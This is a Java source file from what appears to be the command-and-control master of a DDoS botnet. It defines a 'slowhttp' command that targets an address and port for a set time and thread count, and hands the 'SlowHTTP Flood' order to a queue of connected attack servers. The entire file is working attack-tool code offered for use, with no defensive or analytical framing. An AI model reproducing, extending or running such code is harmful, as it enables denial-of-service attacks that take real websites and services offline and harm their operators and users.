package org.anywhere.master.command.impl.methods;

import org.anywhere.master.command.Command;
import org.anywhere.master.encoder.EncoderManager;
import org.anywhere.master.server.ServerData;

import java.util.concurrent.ConcurrentLinkedQueue;

public class CommandSlowHTTP extends Command {

    private final ConcurrentLinkedQueue<ServerData> serverData;
    private final EncoderManager encoderManager;

    public CommandSlowHTTP(final ConcurrentLinkedQueue<ServerData> serverData, final EncoderManager encoderManager) {
        super("slowhttp", "slowhttps", "slowhttp <address> <port> <time> [threads]", "Attack host with SlowHTTP Flood (default: 5 threads)", true);
        this.serverData = serverData;
        this.encoderManager = encoderManager;
    }

    @Override
    public void execute(final String[] args) {
        super.attack(args, "slowhttp", this.encoderManager, this.serverData);
    }
}